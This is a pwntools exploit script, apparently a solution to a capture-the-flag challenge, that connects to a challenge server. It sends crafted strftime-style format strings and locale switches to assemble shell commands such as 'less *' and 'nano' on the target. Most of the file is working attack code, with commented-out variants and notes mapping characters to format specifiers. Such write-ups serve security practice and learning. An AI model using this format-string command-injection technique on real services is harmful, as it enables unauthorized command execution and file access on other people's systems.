from pwn import *

remote = connect('challs2.nusgreyhats.org', 31234)

'''
less

remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%a%*')
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%p% ')
remote.sendline(b'2')
remote.sendline(b'hu_HU.UTF-8')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%%%B')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%B')
remote.sendline(b'2')
remote.sendline(b'it_CH.UTF-8')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%%%B')
remote.sendline(b'3')
print(remote.recvall(2))
'''

'''
ul
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%%%*')
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a% ')
remote.sendline(b'2')
remote.sendline(b'az_AZ.UTF-8')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%B')
remote.sendline(b'2')
remote.sendline(b'ms_MY.UTF-8')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%%%A')
remote.sendline(b'3')
print(remote.recvall(2))
'''

'''
nano
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%a%*')
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%p% ')
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%%%o')
remote.sendline(b'2')
remote.sendline(b'tr_TR.UTF-8')
remote.sendline(b'1')
remote.sendline(b'%s%s%s%B')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%%%B')
remote.sendline(b'3')
print(remote.recvall(2))
'''

remote.sendline(b'1')
remote.sendline(b'%s%s%s%a%%%*')
remote.sendline(b'1')
remote.sendline(b'%s%s%s%a% ')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%a%B')
remote.sendline(b'2')
remote.sendline(b'tr_TR.UTF-8')
remote.sendline(b'1')
remote.sendline(b'%s%s%a%a%%%%%B')
remote.sendline(b'3')
print(remote.recvall(2))


'''
[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA][less *]

* // 37  %s%s%s%a%a%*
  // 36  %s%s%s%a%p% 
s // 35  28 + 8 hu_HU.UTF-8 \xc3\xa1prilis %s%s%a%a%%%%%B
s // 34  27 + 8 hu_HU.UTF-8 április %s%s%a%a%%%B
le // 33  28 + 6 it_CH.UTF-8 aprile %s%s%a%a%%%%%B 
# l // 32  28 + 5 az_AZ.UTF-8 aprel %s%s%a%a%p%B


* // 35  %s%s%s%a%%%*
  // 34  %s%s%s%a% 
l // 33  29 + 5 az_AZ.UTF-8 aprel %s%s%a%a%%%B (%a is 4 bytes \xc5\x9fnb)
u // 32  28 + 5 ms_MY.UTF-8 Sabtu %s%s%a%a%%%%%A

* // 37  %s%s%s%a%a%*
  // 36  %s%s%s%a%p% 
o // 35  %s%s%s%a%%%o
an // 33  30 + 4 tr_TR.UTF-8 Nisan %s%s%s%B
n // 32   28 + 5 tr_TR.UTF-8 Nisan %s%s%a%a%%%%%B

* // 34  %s%s%s%a%*
  // 33  %s%s%s%p% 
. // 32  %s%s%s%%%.

)  36  %s%s%s%a%p%)
*  35  %s%s%s%a%%%*
<  34  %s%s%s%a%<
(  33  %s%s%s%p%(
$  32  %s%s%s%%%$


*  // 35 %s%s%s%a%%%*
   // 34 %s%s%s%a% 
l  // 33 29 + 5 April %s%s%a%a%a%B
n  // 32 Nisan tr_TR.UTF-8 28 + 5  %s%s%a%a%%%%%B


f, i, o, q, v

'''